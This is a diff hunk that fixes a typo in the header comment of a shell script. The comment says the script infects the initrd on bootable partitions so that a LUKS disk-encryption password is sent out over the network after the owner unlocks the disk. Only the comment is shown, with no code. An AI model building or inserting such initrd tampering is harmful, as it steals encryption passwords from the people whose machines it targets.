@@ -1,7 +1,7 @@
 #!/bin/sh
 
 # This script seeks all the bootable partitions on the hard drive, and
-# trues to infect initrd so that if it uses LUKS hard drive encryption,
+# tryes to infect initrd so that if it uses LUKS hard drive encryption,
 # the password will be dumped on the net ASAP after the encrupted disk has
 # been legitimately mounted by his owner.
 
